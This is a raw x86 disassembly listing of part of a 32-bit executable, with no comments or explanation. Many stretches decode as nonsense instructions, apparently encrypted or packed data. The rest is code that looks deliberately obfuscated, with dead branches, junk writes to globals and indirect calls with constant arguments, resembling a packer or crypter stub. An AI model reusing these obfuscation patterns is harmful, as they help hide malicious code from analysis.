  401863:	sub    BYTE PTR [edi-0x151970d6],dl
  401869:	xchg   edi,eax
  40186a:	aam    0x5
  40186c:	das    
  40186d:	add    eax,edi
  40186f:	push   0xfffffffb
  401871:	outs   dx,BYTE PTR ds:[esi]
  401872:	xor    esi,DWORD PTR ds:0xe18fdf6a
  401878:	(bad)  
  401879:	adc    eax,DWORD PTR [eax]
  40187b:	mov    eax,ds:0x781dc5e2
  401880:	call   0x77bf:0x62636a81
  401887:	mov    esp,0xf0b7ecfa
  40188c:	hlt    
  40188d:	xchg   edi,eax
  40188e:	push   0x6
  401890:	add    DWORD PTR [esi+0x603f375f],eax
  401896:	jecxz  0x4018d1
  401898:	mov    edi,0xd1a56912
  40189d:	add    dl,dl
  40189f:	mov    ch,0x4d
  4018a1:	mov    edx,0x12d821c2
  4018a6:	add    al,0x73
  4018a8:	(bad)  
  4018aa:	pop    ds
  4018ab:	clc    
  4018ac:	leave  
  4018ad:	stos   BYTE PTR es:[edi],al
  4018ae:	shl    DWORD PTR [edi],cl
  4018b0:	and    al,0x6d
  4018b2:	icebp  
  4018b3:	in     eax,0x1e
  4018b5:	sti    
  4018b6:	xor    eax,0xfdeaaf55
  4018bb:	sbb    al,0x32
  4018bd:	xchg   esp,eax
  4018be:	add    ch,0xa3
  4018c1:	jg     0x4018c1
  4018c3:	xchg   BYTE PTR [ebp+0x42],cl
  4018c6:	adc    al,ch
  4018c8:	or     edx,DWORD PTR [eax+eax*2-0x2e]
  4018cc:	shr    DWORD PTR [esi],cl
  4018ce:	stos   DWORD PTR es:[edi],eax
  4018cf:	mov    eax,DWORD PTR [esi+0x2a133d06]
  4018d5:	enter  0x3a83,0x2b
  4018d9:	inc    esp
  4018da:	mov    ah,0xfe
  4018dc:	inc    ecx
  4018dd:	xchg   esi,eax
  4018de:	cdq    
  4018df:	mov    al,BYTE PTR [ebp-0x3c]
  4018e2:	sar    DWORD PTR [ebp-0x30bce24e],0x93
  4018e9:	cld    
  4018ea:	mov    esp,0x9dbddcc2
  4018ef:	test   BYTE PTR [ebx+esi*2-0x55],0x9c
  4018f4:	int3   
  4018f5:	add    al,0x33
  4018f7:	xor    BYTE PTR [ebx+0x26e97573],cl
  4018fd:	lods   eax,DWORD PTR ds:[esi]
  4018fe:	push   DWORD PTR [esi]
  401900:	fild   DWORD PTR [ebp-0x3a]
  401903:	mov    esi,ecx
  401905:	aas    
  401906:	mov    ch,0xf2
  401908:	out    0x64,al
  40190a:	xchg   esi,eax
  40190b:	dec    esp
  40190c:	imul   ecx,DWORD PTR [eax+0x53f68c4a],0xdbd68251
  401916:	push   ecx
  401917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401918:	jnp    0x4018ee
  40191a:	fmul   st(1),st
  40191c:	fcom   QWORD PTR [edi-0x727710ad]
  401922:	mov    ch,0xed
  401924:	xchg   edi,eax
  401925:	xor    eax,0x7d515e9a
  40192a:	add    al,0x31
  40192c:	or     bl,BYTE PTR [esi+0x1a]
  40192f:	mov    ecx,0x2b6eabea
  401934:	ret    0xabba
  401937:	xor    DWORD PTR [eax],eax
  401939:	add    BYTE PTR [ecx-0x30e457bb],cl
  40193f:	cmp    DWORD PTR ds:0x428267,0x0
  401946:	not    DWORD PTR ds:0x4282df
  40194c:	mov    edi,DWORD PTR ds:0x428183
  401952:	mov    DWORD PTR ds:0x42827f,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x4282eb,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x428267,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428d6c
  401981:	mov    edx,DWORD PTR ds:0x428387
  401987:	adc    DWORD PTR ds:0x4282ef,edx
  40198d:	and    edx,DWORD PTR ds:0x42823f
  401993:	add    DWORD PTR ds:0x42826f,edx
  401999:	mov    edi,DWORD PTR ds:0x428163
  40199f:	xor    DWORD PTR ds:0x42818b,edi
  4019a5:	and    DWORD PTR ds:0x42815b,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x42836b
  4019b4:	sub    ecx,DWORD PTR ds:0x42826b
  4019ba:	mov    DWORD PTR ds:0x42836b,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x42837b,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x428373,0x339b
  4019e6:	mov    eax,ds:0x4223c0
  4019eb:	cmp    DWORD PTR ds:0x428257,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x428267
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x428257,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x428277
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428e58
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x428177
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x428167
  401a44:	sub    DWORD PTR ds:0x4282f3,ecx
  401a4a:	add    DWORD PTR ds:0x428173,0x42826b
  401a54:	xor    edx,DWORD PTR ds:0x4282db
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x428183,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x428183,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x428257
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x42830f,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x42825b,0x206f
  401a9e:	cmp    DWORD PTR ds:0x428183,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428d70
  401ac0:	sub    edx,DWORD PTR ds:0x428393
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x42837f
  401ad4:	adc    ecx,DWORD PTR ds:0x42816f
  401ada:	mov    DWORD PTR ds:0x42837f,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x42816b
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x428153,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x428267,0x6ba0
  401b03:	mov    DWORD PTR ds:0x42817f,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x42815f,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x428153,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428ec0
  401b3a:	movzx  edx,WORD PTR ds:0x42828f
  401b41:	and    edx,DWORD PTR ds:0x42816b
  401b47:	mov    DWORD PTR ds:0x42828f,edx
  401b4d:	and    DWORD PTR ds:0x428247,edx
  401b53:	add    DWORD PTR ds:0x42838b,edx
  401b59:	sub    edx,DWORD PTR ds:0x428293
  401b5f:	add    DWORD PTR ds:0x42824b,edi
  401b65:	or     edx,DWORD PTR ds:0x428377
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x4282fb,0x0
  401b78:	mov    DWORD PTR ds:0x428293,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x428163,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428237
  401ba1:	cmp    DWORD PTR ds:0x4282fb,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428d84
  401bc7:	sub    DWORD PTR ds:0x4282e7,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42824b
  401bd4:	add    DWORD PTR ds:0x4282f7,edx
  401bda:	add    DWORD PTR ds:0x42814f,ebx
  401be0:	sbb    DWORD PTR ds:0x42821f,edi
  401be6:	inc    DWORD PTR ds:0x42821f
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x428383,0x428227
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0xecb0afeb
  401c11:	xchg   ecx,eax
  401c12:	push   ebx
  401c13:	stos   BYTE PTR es:[edi],al
  401c14:	and    eax,0x9e18180a
  401c19:	adc    bl,BYTE PTR [eax]
  401c1b:	sbb    BYTE PTR [eax],dh
  401c1d:	std    
  401c1e:	add    esp,DWORD PTR [edi]
  401c20:	mov    cl,0x94
  401c22:	xchg   ecx,eax
  401c23:	push   0x40
  401c25:	sub    dl,BYTE PTR [edx+esi*8]
  401c28:	mov    esi,0xeeb04cee
  401c2d:	stos   BYTE PTR es:[edi],al
  401c2e:	mov    DWORD PTR [ebx+0x66],edx
  401c31:	fst    DWORD PTR [edi-0x75]
  401c34:	pop    ss
  401c35:	les    esi,FWORD PTR [edx+0x48]
  401c38:	xor    eax,0x8b516a43
  401c3d:	xlat   BYTE PTR ds:[ebx]
  401c3e:	daa    
  401c3f:	xor    DWORD PTR [edx],esp
  401c41:	sub    DWORD PTR [edi],ecx
  401c43:	mov    ecx,0xecc9aa20
  401c48:	aaa    
  401c49:	in     al,dx
  401c4a:	xchg   edx,eax
  401c4b:	mov    bh,0xf4
  401c4d:	fwait
  401c4e:	leave  
  401c4f:	sbb    BYTE PTR [eax+ecx*8-0x7c78357d],dh
  401c56:	mov    BYTE PTR [edx],dl
  401c58:	ds xchg ecx,eax
  401c5a:	xor    ebp,DWORD PTR [esp+esi*4-0x774e27bc]
  401c61:	lods   ax,WORD PTR ds:[esi]
  401c63:	stos   DWORD PTR es:[edi],eax
  401c64:	int3   
  401c65:	adc    al,0x7
  401c67:	jb     0x401cd1
  401c69:	imul   BYTE PTR [esp+ebx*1]
  401c6c:	out    dx,al
  401c6d:	lods   eax,DWORD PTR ds:[esi]
  401c6e:	adc    al,0xa2
  401c70:	lea    edi,[ecx+eax*1+0x7e]
  401c74:	mov    eax,ds:0x4bf718b7
  401c79:	jae    0x401c93
  401c7b:	ds inc eax
  401c7d:	out    0x26,al
  401c7f:	push   ss
  401c80:	add    eax,0xe1069370
  401c85:	sub    eax,0x27ddc50e
  401c8a:	aam    0x38
  401c8c:	pop    ebx
  401c8d:	or     eax,0xc279355b
  401c92:	inc    esi
  401c93:	cmp    al,BYTE PTR [ebp-0x46]
  401c96:	adc    ebx,DWORD PTR [ebx+eiz*8-0x4acb1875]
  401c9d:	push   ebx
  401c9e:	fwait
  401c9f:	enter  0xbc2e,0xa1
  401ca3:	inc    ebx
  401ca4:	cmp    esi,edx
  401ca6:	jns    0x401c90
  401ca8:	mov    al,ds:0x7bad9831
  401cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cae:	cmp    BYTE PTR [esi+0x32],al
  401cb1:	mov    ebx,0xd8dd0429
  401cb6:	fsubr  QWORD PTR [ebp+0x33]
  401cb9:	push   0x19
  401cbb:	xchg   ebp,eax
  401cbc:	inc    ecx
  401cbd:	mov    esp,0xb0ed26df
  401cc2:	cwde   
  401cc3:	rcr    BYTE PTR [ebx-0x45],1
  401cc6:	mov    cl,0x56
  401cc8:	pushf  
  401cc9:	mov    ah,0x34
  401ccb:	xor    BYTE PTR [ecx+0x4d1de6e],bh
  401cd1:	test   al,0xac
  401cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd4:	jl     0x401d12
  401cd6:	sar    DWORD PTR [eax-0x12edc15d],0x38
  401cdd:	or     eax,0x74c6486d
  401ce2:	xor    ecx,ebp
  401ce4:	rcl    edi,1
  401ce6:	test   BYTE PTR [ecx-0x7560dfbb],0xa9
  401ced:	add    al,0x7c
  401cef:	arpl   WORD PTR [ebp-0x3b],ax
  401cf2:	cmp    eax,0xf91bc3b
  401cf7:	pop    esi
  401cf8:	jmp    FWORD PTR [ebp-0x5e]
  401cfb:	repnz bound ecx,QWORD PTR [eax-0x2c0e6fa0]
  401d02:	xchg   edx,eax
  401d03:	jns    0x401ce1
  401d05:	stos   BYTE PTR es:[edi],al
  401d06:	adc    BYTE PTR [ebx],al
  401d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d09:	out    0xa4,al
  401d0b:	cmp    al,0xdc
  401d0d:	shl    BYTE PTR [ecx],0x7
  401d10:	push   0xfffffff0
  401d12:	(bad)  
  401d13:	(bad)  
  401d15:	nop
  401d16:	lds    eax,FWORD PTR [ecx]
  401d18:	inc    ebp
  401d19:	adc    al,0x30
  401d1b:	loop   0x401cb0
  401d1d:	vcmpss xmm2,xmm5,DWORD PTR [esi+0x6dc2a0e3],0x7c
  401d26:	dec    esi
  401d27:	fsubr  DWORD PTR [eax+ebx*2]
  401d2a:	cli    
  401d2b:	xchg   BYTE PTR [edx+0x6565407e],cl
  401d31:	dec    ebx
  401d32:	cld    
  401d33:	cmp    BYTE PTR [eax+0x7f],ah
  401d36:	xor    BYTE PTR [edx+0x77],ch
  401d39:	popa   
  401d3a:	bound  esi,QWORD PTR [ebp-0x6]
  401d3d:	(bad)  
  401d3e:	fisubr DWORD PTR [ebx+0x2282ae19]
  401d44:	ins    DWORD PTR es:[edi],dx
  401d45:	pusha  
  401d46:	jmp    0x4bea23f0
  401d4b:	ins    DWORD PTR es:[edi],dx
  401d4c:	push   0xffffffea
  401d4e:	dec    ebx
  401d4f:	and    dl,BYTE PTR [ebp+0x1c]
  401d52:	add    BYTE PTR [esi+0x37],cl
  401d55:	test   edi,edx
  401d57:	pop    ss
  401d58:	shl    BYTE PTR [edi],cl
  401d5a:	mov    gs,WORD PTR [edi-0x7]
  401d5d:	test   DWORD PTR [edi-0x50630e0a],edi
  401d63:	sub    cl,BYTE PTR [ebx+edx*4]
  401d66:	inc    edx
  401d67:	test   BYTE PTR [edx],bl
  401d69:	loopne 0x401dd2
  401d6b:	cwde   
  401d6c:	fs sbb al,0xd
  401d6f:	aam    0x6c
  401d71:	cmp    DWORD PTR [edx],0xffffff83
  401d74:	(bad)  
  401d75:	(bad)  
  401d76:	jl     0x401d57
  401d78:	or     al,0x1a
  401d7a:	mov    bl,0xa4
  401d7c:	leave  
  401d7d:	xor    al,0x7
  401d7f:	sub    eax,0xb4a9409
  401d84:	test   BYTE PTR ds:[ecx+ebx*1+0x48e9692d],bl
  401d8c:	shr    DWORD PTR [ebp+ebx*1+0x36],cl
  401d90:	push   es
  401d91:	pop    es
  401d92:	add    ecx,DWORD PTR [ebx-0x23]
  401d95:	or     eax,0x2eef4d15
  401d9a:	scas   eax,DWORD PTR es:[edi]
  401d9b:	ja     0x401d72
  401d9d:	and    bh,BYTE PTR [ebp+0x8]
  401da0:	in     eax,dx
  401da1:	dec    esp
  401da2:	cmc    
  401da3:	mov    ds:0x7e39c5c1,al
  401da8:	adc    BYTE PTR [edx+edi*1-0x5c],dh
  401dac:	dec    edi
  401dad:	push   cs
  401dae:	add    al,0x3d
  401db0:	xor    BYTE PTR [edi-0x32],dh
  401db3:	pop    esi
  401db4:	mov    ch,0xe4
  401db6:	mov    ds:0x190e502c,eax
  401dbb:	repnz loop 0x401dd9
  401dbe:	cs jb  0x401e2c
  401dc1:	jno    0x401d56
  401dc3:	push   esp
  401dc4:	mov    al,0x4e
  401dc6:	xchg   edx,eax
  401dc7:	adc    bl,BYTE PTR [ecx+0x30]
  401dca:	sub    esi,esi
  401dcc:	sub    cl,BYTE PTR [edi-0xe]
  401dcf:	push   esi
  401dd0:	ficom  DWORD PTR [edx+0x4b]
  401dd3:	repz (bad) 
  401dd5:	mov    dh,0x22
  401dd7:	mov    bh,0x26
  401dd9:	inc    edx
  401dda:	loop   0x401e53
  401ddc:	jo     0x401d7f
  401dde:	mov    dh,0x3d
  401de0:	sub    eax,0x8b9f4845
  401de5:	div    BYTE PTR [edx]
  401de7:	das    
  401de8:	or     al,0xba
  401dea:	mov    eax,0xb852b349
  401def:	sbb    bh,BYTE PTR [edx+0x5f4410f4]
  401df5:	and    DWORD PTR [edi+0x29],0x974fa32f
  401dfc:	sub    BYTE PTR [esi+0x193ef7e],bh
  401e02:	test   al,0xcc
  401e04:	adc    al,0xed
  401e06:	dec    edx
  401e07:	rol    DWORD PTR [edx-0x60],0x96
  401e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e0c:	jne    0x401dde
  401e0e:	std    
  401e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e10:	pop    esp
  401e11:	dec    edi
  401e12:	push   ebx
  401e13:	test   DWORD PTR [edx-0x4e89c9e3],edx
  401e19:	hlt    
  401e1a:	jmp    0x2ebb:0x9529ff27
  401e21:	cdq    
  401e22:	adc    edx,DWORD PTR [ecx+0x410245a2]
  401e28:	jg     0x401ddb
  401e2a:	ss in  eax,dx
  401e2c:	xchg   ebx,eax
  401e2d:	sub    eax,0x5fb56f45
  401e32:	jmp    0x401eaf
  401e34:	js     0x401e42
  401e36:	pop    ss
  401e37:	out    dx,al
  401e38:	or     eax,0x12891a7a
  401e3d:	(bad)  
  401e3e:	ficom  WORD PTR [esi+0x61]
  401e41:	test   eax,0xea1d3159
  401e46:	jae    0x401de4
  401e48:	lods   eax,DWORD PTR ds:[esi]
  401e49:	daa    
  401e4a:	je     0x401ec1
  401e4c:	(bad)  
  401e4d:	clc    
  401e4e:	test   DWORD PTR [ecx-0x53],edi
  401e51:	(bad)
  401e55:	add    al,0xed
  401e57:	xor    edi,0x943b4139
  401e5d:	mov    ds:0x3f258616,eax
  401e62:	or     eax,0x30d81734
  401e67:	aas    
  401e68:	imul   ebx,ebx,0xffffff99
  401e6b:	jecxz  0x401e2a
  401e6d:	sbb    ebx,DWORD PTR [eax+eiz*2]
  401e70:	ror    BYTE PTR [ebp-0x67],cl
  401e73:	mov    edi,0x7a951a7d
  401e78:	sub    eax,0x656fb910
  401e7d:	mov    bl,0x4f
  401e7f:	or     bl,BYTE PTR [ebp-0x48]
  401e82:	push   0xd1ea8dac
  401e87:	retf   
  401e88:	les    edi,FWORD PTR [edi+0x67]
  401e8b:	xor    al,0x56
  401e8d:	popf   
  401e8e:	cs (bad) 
  401e90:	outs   dx,DWORD PTR ds:[esi]
  401e91:	sub    esi,DWORD PTR [ebx]
  401e93:	add    eax,0x651c0abc
  401e98:	xor    edi,DWORD PTR [ecx+0x1116fb1d]
  401e9e:	repz cmp esi,ecx
  401ea1:	dec    ebp
  401ea2:	fld    TBYTE PTR [esi-0x2ac5b99e]
  401ea8:	mov    ds:0x9a8dfaf8,al
  401ead:	dec    esp
  401eae:	jecxz  0x401f22
  401eb0:	inc    esi
  401eb1:	add    BYTE PTR gs:[eax+0x3c],bl
  401eb5:	mov    ebp,DWORD PTR [ebx-0x76]
  401eb8:	push   eax
  401eb9:	and    DWORD PTR ds:0x7b7b153e,esi
  401ebf:	add    DWORD PTR [ecx-0x67],esi
  401ec2:	stc    
  401ec3:	not    BYTE PTR [eax]
  401ec5:	xchg   edi,eax
  401ec6:	adc    esp,eax
  401ec8:	jne    0x401f10
  401eca:	bound  edi,QWORD PTR [edx-0x35c51408]
  401ed0:	scas   eax,DWORD PTR es:[edi]
  401ed1:	je     0x401e93
  401ed3:	stos   BYTE PTR es:[edi],al
  401ed4:	(bad)  
  401ed5:	pushf  
  401ed6:	ss lahf 
  401ed8:	jno    0x401eb7
  401eda:	out    0x82,eax
  401edc:	sti    
  401edd:	imul   edi,DWORD PTR ds:[esi],0x6ebc29b3
  401ee4:	lea    bp,[edx+0x33ec4b79]
  401eeb:	sbb    al,0xf5
  401eed:	daa    
  401eee:	push   edx
  401eef:	mov    edi,DWORD PTR [ebx]
  401ef1:	jecxz  0x401f4e
  401ef3:	loopne 0x401f6f
  401ef5:	fld    DWORD PTR [edi+edx*2-0x7494a73a]
  401efc:	sub    al,0xfc
  401efe:	test   eax,0x22b19efe
  401f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f04:	or     BYTE PTR [esi+0x57],dh
  401f07:	xchg   edx,eax
  401f08:	xor    al,BYTE PTR [edi+0x2b]
  401f0b:	jmp    0x6e26:0xbd49f2b8
  401f12:	push   0xffffff91
  401f14:	xlat   BYTE PTR ds:[ebx]
  401f15:	add    al,0x80
  401f17:	adc    al,0x4e
  401f19:	jno    0x401f96
  401f1b:	push   0x39938696
  401f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f21:	jp     0x401f0d
  401f23:	scas   eax,DWORD PTR es:[edi]
  401f24:	and    al,0xe1
  401f26:	mov    ah,dh
  401f28:	inc    esi
  401f29:	or     DWORD PTR [esi-0x5d],edi
  401f2c:	mov    ss,WORD PTR [ebp+0x67]
  401f2f:	push   esp
  401f30:	hlt    
  401f31:	add    DWORD PTR [edx],edi
  401f33:	xor    eax,0x44c9955a
  401f38:	shr    edi,1
  401f3a:	rcr    dl,1
  401f3c:	xchg   esp,eax
  401f3d:	mov    ebx,0xc55edf9e
  401f42:	jb     0x401fbb
  401f44:	out    0x59,eax
  401f46:	(bad)
  401f49:	xor    eax,DWORD PTR [edi]
  401f4b:	mov    edx,0x88041da
  401f50:	std    
  401f51:	push   0xffffff95
  401f53:	fdiv   DWORD PTR [esi+ebp*4]
  401f56:	and    ebx,ebx
  401f58:	mov    bh,0xe2
  401f5a:	jnp    0x401ee0
  401f5c:	fadd   DWORD PTR [ecx]
  401f5e:	sbb    BYTE PTR [ebx-0x8],cl
  401f61:	xor    esi,ebp
  401f63:	leave  
  401f64:	mov    dh,0x39
  401f66:	data16 ins BYTE PTR es:[edi],dx
  401f68:	out    dx,eax
  401f69:	cmp    al,0x1e
  401f6b:	es sub al,bl
  401f6e:	jmp    0x413c:0x5a76a94b
  401f75:	fdivp  st(4),st
  401f77:	(bad)  
  401f78:	popf   
  401f79:	mov    eax,0x9695395b
  401f7e:	aaa    
  401f7f:	rcl    BYTE PTR [edx+0x622cea24],1
  401f85:	jmp    0xf758efb7
  401f8a:	adc    cl,BYTE PTR [eax+0x77]
  401f8d:	pop    esp
  401f8e:	jbe    0x401fe1
  401f90:	or     eax,0x2abbb6d2
  401f95:	in     al,0xab
  401f97:	pop    esp
  401f98:	mov    eax,0xafb540c7
  401f9d:	mov    ecx,0xf7d111dd
  401fa2:	mov    DWORD PTR [ebp+0x5546fbb9],esi
  401fa8:	sbb    bh,BYTE PTR [ecx-0x3]
  401fab:	push   cs
  401fac:	in     eax,0x10
  401fae:	xor    ch,BYTE PTR [esi]
  401fb0:	in     al,dx
  401fb1:	(bad)  
  401fb2:	cmp    ecx,DWORD PTR [ecx]
  401fb4:	xchg   ecx,eax
  401fb5:	pop    es
  401fb6:	ins    DWORD PTR es:[edi],dx
  401fb7:	or     BYTE PTR [ebp+0x161dc0ab],bh
  401fbd:	cmp    BYTE PTR [ebx-0x1c4197fd],ah
  401fc3:	dec    esi
  401fc4:	inc    ebp
  401fc5:	or     BYTE PTR es:[eax],cl
  401fc8:	std    
  401fc9:	xor    DWORD PTR [edi],eax
  401fcb:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  401fcd:	sbb    DWORD PTR [eax],ecx
  401fcf:	pop    edi
  401fd0:	test   al,0x22
  401fd2:	adc    al,0xfd
  401fd4:	sub    ch,BYTE PTR [edi]
  401fd6:	(bad)  
  401fd7:	mov    esp,DWORD PTR [edi+ebp*8]
  401fda:	xchg   edx,eax
  401fdb:	in     al,dx
  401fdc:	dec    ebx
  401fdd:	mov    DWORD PTR [ebp-0x3c],edx
  401fe0:	mov    DWORD PTR [ebp-0x70],0x2c55
  401fe7:	mov    eax,ds:0x42835b
  401fec:	adc    DWORD PTR ds:0x428397,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x42837b,0x0
  402000:	mov    DWORD PTR ds:0x42827b,0x4df8
  40200a:	mov    DWORD PTR ds:0x428363,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x42837b,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428d88
  40203e:	or     DWORD PTR ds:0x42815f,0x6f29
  402048:	xor    DWORD PTR ds:0x4282fb,0x4282ef
  402052:	add    DWORD PTR ds:0x42827b,0x428317
  40205c:	and    DWORD PTR ds:0x42838b,edi
  402062:	mov    DWORD PTR ds:0x42826b,0x2a04
  40206c:	sub    DWORD PTR ds:0x42818b,0x42814b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x4282df,0x0
  402084:	mov    DWORD PTR ds:0x4282db,ecx
  40208a:	mov    DWORD PTR ds:0x428187,0x59f
  402094:	mov    DWORD PTR ds:0x428187,ecx
  40209a:	mov    DWORD PTR ds:0x428307,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x4282df,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x42815b
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428ec4
  4020ce:	sbb    DWORD PTR ds:0x42836b,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x4282eb,0x42825f
  4020e2:	adc    DWORD PTR ds:0x42835f,0x4c73
  4020ec:	add    DWORD PTR ds:0x42835f,0x42838f
  4020f6:	and    DWORD PTR ds:0x428147,0x428363
  402100:	sbb    DWORD PTR ds:0x42814b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x4282df,0x42828f
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x4282db
  40213c:	add    DWORD PTR ds:0x428277,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x42836b
  40214e:	add    DWORD PTR ds:0x428307,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x428157,0x0
  402162:	mov    DWORD PTR ds:0x42837b,0x750f
  40216c:	not    DWORD PTR ds:0x428363
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x42825b,0x610f
  402181:	mov    eax,ds:0x42816f
  402186:	cmp    DWORD PTR ds:0x428157,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x428059
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428e60
  4021b1:	adc    DWORD PTR ds:0x42827f,0x428253
  4021bb:	add    DWORD PTR ds:0x42823f,0x168f
  4021c5:	sub    DWORD PTR ds:0x4282e3,0x428183
  4021cf:	or     DWORD PTR ds:0x428383,0xa53
  4021d9:	mov    eax,ds:0x428237
  4021de:	xor    DWORD PTR ds:0x42814b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0x7e51ab9b
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi+0x77181812],bl
  40220e:	xchg   ebp,eax
  40220f:	in     eax,dx
  402210:	test   DWORD PTR [eax+0x6f],0x887ab493
  402217:	lods   al,BYTE PTR ds:[esi]
  402218:	jmp    0xb3610abd
  40221d:	and    BYTE PTR [ecx+0x4f],bl
  402220:	stc    
  402221:	lahf   
  402222:	jle    0x4021e6
  402224:	and    al,cl
  402226:	dec    ebp
  402227:	mov    dh,cl
  402229:	jl     0x40220d
  40222b:	sbb    al,BYTE PTR [ecx+edx*2]
  40222e:	stos   DWORD PTR es:[edi],eax
  40222f:	xchg   edi,eax
